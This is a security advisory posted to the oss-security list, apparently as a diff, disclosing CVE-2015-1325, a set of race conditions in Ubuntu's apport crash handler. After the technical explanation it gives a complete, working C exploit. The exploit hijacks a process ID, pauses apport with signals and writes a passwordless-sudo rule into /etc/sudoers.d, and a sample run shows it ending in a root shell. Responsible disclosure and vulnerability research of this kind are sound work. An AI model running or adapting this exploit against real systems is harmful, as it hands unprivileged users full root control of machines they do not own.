@@ -1,0 +1,342 @@
+
+Date: Thu, 21 May 2015 17:30:41 +0000 (GMT)
+From: Philip Pettersson <p.pettersson@...sung.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE-2015-1325 apport race conditions / ubuntu local root
+
+Hello, this is CVE-2015-1325 which was reported to the Ubuntu Security Team
+on 2015-05-11. 
+
+There are several race conditions in the apport crash reporter, leading to a
+reliable local root privilege escalation that affects all current LTS versions
+of Ubuntu Server/Desktop (default install).
+
+Apport is also available on other distributions but as far as I know it is
+only in use by default on Ubuntu.
+
+--- DETAILS
+
+Apport is specified as the coredump handler (/proc/sys/kernel/core_pattern)
+since at least Ubuntu 12.04.
+
+When a process receives a signal that should generate a coredump,
+/usr/share/apport/apport will be invoked by the kernel as root.
+
+On line 284, apport "partially drops privileges":
+	drop_privileges(pid, True)
+
+However, this has no real security benefit since the euid of the process will
+still be root. In fact, this will make the second part of the attached exploit
+more reliable because it allows us to send the privileged apport process
+SIGSTOP/SIGCONT and hit the last race easily.
+
+On line 394 apport opens a file in /var/crash:
+	with open(report, 'rb') as f:
+
+report is the filename, which can be easily predicted. If a user with uid 1000
+makes /bin/sleep crash, the filename will be: /var/crash/_bin_sleep.1000.crash
+
+The directory /var/crash is world writable, so we can create a FIFO in this
+directory before making our program crash. Apport will then try to read our
+file and hang on line 394 until a report is written to the FIFO by us.
+
+When apport is in this paused state, we can kill our original process and keep
+forking until we get the same pid again. We then make this process execute
+/bin/su which makes our original pid belong to a root process.
+
+The drop_privileges() function on line 49 incorrectly uses the pid as the
+indicator as to which uid we should drop privileges to:
+
+def drop_privileges(pid, partial=False):
+[...]
+        stat = os.stat('/proc/%s/stat' % pid)
+[...]
+        effective_uid = stat.st_uid
+[...]
+        os.setreuid(stat.st_uid, effective_uid)
+
+We can therefore make apport "drop" privileges to uid 0 and write a corefile
+anywhere on the system.
+
+This can be used to write a corefile with crafted contents in a suitable
+location to gain root privileges.
+
+On versions since at least Ubuntu 14.04 it is possible to completely control
+the contents of the written corefile. This allows easy and reliable
+exploitation by leveraging /etc/sudoers.d.
+
+--- EXPLOIT FLOW
+
+1. Create a FIFO in /var/crash/_bin_sleep.$uid.crash.
+2. fork(), chdir("/etc/sudoers.d"), execute /bin/sleep and send SIGSEGV
+3. Send SIGKILL to the process in (2), fork() until we get the same pid
+   as the process we killed.
+4. In our new process with the original pid, execute /bin/su.
+5. Send valid report data to /var/crash/_bin_sleep.$uid.crash.
+6. Core file is written to /etc/sudoers.d/core as root with mode 0600.
+
+We could put this corefile in /etc/cron.hourly, /etc/logrotate.d and so on.
+
+Additionally, on 14.04+ we can do this:
+
+The partial privilege drop on line 284 allows us to send SIGSTOP to apport,
+which gives us great control over the execution flow. On line 460 apport will
+ultimately write the corefile contents by reading from the report file it just
+created in /var/crash.
+
+7. Keep sending SIGSTOP/SIGCONT until these lines have been executed:
+   404: os.unlink(report)
+   410: reportfile = os.fdopen(os.open(report, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0), 'wb')
+8. Unlink /var/crash/_bin_sleep.$uid.crash
+9. Create FIFO in /var/crash/_bin_sleep.$uid.crash
+10. Write crafted contents to /var/crash/_bin_sleep.$uid.crash
+11. Apport will read our FIFO at line 155 and create a corefile with our
+    crafted contents.
+
+--- CREDIT
+
+Philip Pettersson, Samsung SDS Security Center
+
+--- EXPLOIT
+
+/*
+*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
+CVE-2015-1325 / apport-pid-race.c
+apport race conditions
+
+ubuntu local root
+tested on ubuntu server 14.04, 14.10, 15.04
+
+core dropping bug also works on older versions, but you can't
+write arbitrary contents. on 12.04 /etc/logrotate.d might work,
+didn't check. sudo and cron will complain if you drop a real ELF
+core file in sudoers.d/cron.d
+
+unpriv@...ntu-1504:~$ gcc apport-race.c -o apport-race && ./apport-race
+created /var/crash/_bin_sleep.1002.crash
+crasher: my pid is 1308
+apport stopped, pid = 1309
+getting pid 1308
+current pid = 1307..2500..5000..7500..10000........
+** child: current pid = 1308
+** child: executing /bin/su
+Password: sleeping 2s..
+
+checker: mode 4532
+waiting for file to be unlinked..writing to fifo
+fifo written.. wait...
+waiting for /etc/sudoers.d/core to appear..
+
+checker: new mode 32768 .. done
+checker: SIGCONT
+checker: writing core
+checker: done
+success
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+85ad63cf7248d7da46e55fa1b1c6fe01dea43749
+2015-05-10
+%rebel%
+*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
+*/
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <signal.h>
+#include <sys/mman.h>
+#include <sys/syscall.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <sys/resource.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/wait.h>
+
+
+char *crash_report = "ProblemType: Crash\nArchitecture: amd64\nCrashCounter: 0\nDate: Sat May  9 18:18:33 2015\nDistroRelease: Ubuntu 15.04\nExecutablePath: /bin/sleep\nExecutableTimestamp: 1415000653\nProcCmdline: sleep 1337\nProcCwd: /home/rebel\nProcEnviron:\n XDG_RUNTIME_DIR=<set>\nProcMaps:\n 00400000-00407000 r-xp 00000000 08:01 393307                             /bin/sleep\nProcStatus:\n Name:  sleep\nSignal: 11\nUname: Linux 3.19.0-15-generic x86_64\nUserGroups:\n_LogindSession: 23\nCoreDump: base64\n H4sICAAAAAAC/0NvcmVEdW1wAA==\n U1ZgZGJm4eLicvTxUQBiWw0goang5x/gGBwc7mIFEuMCAA==\n";
+/*
+last line is the stuff we write to the corefile
+
+c = zlib.compressobj(9,zlib.DEFLATED,-zlib.MAX_WBITS)
+t = '# \x01\x02\x03\x04\n\n\nALL ALL=(ALL) NOPASSWD: ALL\n'
+# need some non-ASCII bytes so it doesn't turn into a str()
+# which makes apport fail with the following error:
+#    os.write(core_file, r['CoreDump'])
+# TypeError: 'str' does not support the buffer interface
+t = bytes(t,'latin1')
+c.compress(t)
+a = c.flush()
+import base64
+base64.b64encode(a)
+
+# b'U1ZgZGJm4eLicvTxUQBiWw0goang5x/gGBwc7mIFEuMCAA=='
+*/
+
+int apport_pid;
+char report[128];
+
+void steal_pid(int wanted_pid)
+{
+    int x, pid;
+
+    pid = getpid();
+
+    fprintf(stderr,"getting pid %d\n", wanted_pid);
+    fprintf(stderr,"current pid = %d..", pid);
+
+    for(x = 0; x < 500000; x++) {
+        pid = fork();
+        if(pid == 0) {
+            pid = getpid();
+            if(pid % 2500 == 0)
+                fprintf(stderr,"%d..", pid);
+
+            if(pid == wanted_pid) {
+                fprintf(stderr,"\n** child: current pid = %d\n", pid);
+                fprintf(stderr,"** child: executing /bin/su\n");
+
+                execl("/bin/su", "su", NULL);
+            }
+            exit(0);
+            return;
+        }
+        if(pid == wanted_pid)
+            return;
+
+        wait(NULL);
+    }
+
+}
+
+
+
+void checker(void)
+{
+    struct stat s;
+    int fd, mode, x;
+
+    stat(report, &s);
+
+    fprintf(stderr,"\nchecker: mode %d\nwaiting for file to be unlinked..", s.st_mode);
+
+    mode = s.st_mode;
+
+    while(1) {
+// poor man's pseudo-singlestepping
+        kill(apport_pid, SIGCONT);
+        kill(apport_pid, SIGSTOP);
+
+// need to wait a bit for the signals to be handled,
+// otherwise we'll miss when the new report file is created
+        for(x = 0; x < 100000; x++);
+
+        stat(report, &s);
+
+        if(s.st_mode != mode)
+            break;
+    }
+
+    fprintf(stderr,"\nchecker: new mode %d .. done\n", s.st_mode);
+
+    unlink(report);
+    mknod(report, S_IFIFO | 0666, 0);
+
+    fprintf(stderr,"checker: SIGCONT\n");
+    kill(apport_pid, SIGCONT);
+
+    fprintf(stderr,"checker: writing core\n");
+
+    fd = open(report, O_WRONLY);
+    write(fd, crash_report, strlen(crash_report));
+    close(fd);
+    fprintf(stderr,"checker: done\n");
+
+    while(1)
+        sleep(1);
+}
+
+
+
+void crasher()
+{
+    chdir("/etc/sudoers.d");
+
+    fprintf(stderr,"crasher: my pid is %d\n", getpid());
+
+    execl("/bin/sleep", "sleep", "1337", NULL);
+
+    exit(0);
+}
+
+
+int main(void)
+{
+    int pid, checker_pid, fd;
+    struct rlimit limits;
+    struct stat s;
+
+    limits.rlim_cur = RLIM_INFINITY;
+    limits.rlim_max = RLIM_INFINITY;
+    setrlimit(RLIMIT_CORE, &limits);
+
+    pid = fork();
+
+    if(pid == 0)
+        crasher();
+
+    sprintf(report, "/var/crash/_bin_sleep.%d.crash", getuid());
+
+    unlink(report);
+    mknod(report, S_IFIFO | 0666, 0);
+
+    fprintf(stderr,"created %s\n", report);
+
+    usleep(300000);
+    kill(pid, 11);
+    apport_pid = pid + 1;
+// could check that pid+1 is actually apport here but it's
+// kind of likely
+    fprintf(stderr,"apport stopped, pid = %d\n", apport_pid);
+
+    usleep(300000);
+
+    kill(pid, 9);
+    steal_pid(pid);
+    sleep(1);
+
+    kill(apport_pid, SIGSTOP);
+
+    checker_pid = fork();
+
+    if(checker_pid == 0) {
+        checker();
+        exit(0);
+    }
+
+    fprintf(stderr,"sleeping 2s..\n");
+    sleep(2);
+
+    fprintf(stderr,"writing to fifo\n");
+
+    fd = open(report, O_WRONLY);
+    write(fd, crash_report, strlen(crash_report));
+    close(fd);
+
+    fprintf(stderr,"fifo written.. wait...\n");
+    fprintf(stderr,"waiting for /etc/sudoers.d/core to appear..\n");
+
+    while(1) {
+        stat("/etc/sudoers.d/core", &s);
+        if(s.st_size == 37)
+            break;
+        usleep(100000);
+    }
+
+    fprintf(stderr,"success\n");
+    kill(pid, 9);
+    kill(checker_pid, 9);
+    return system("sudo -- sh -c 'stty echo;sh -i'");
+}
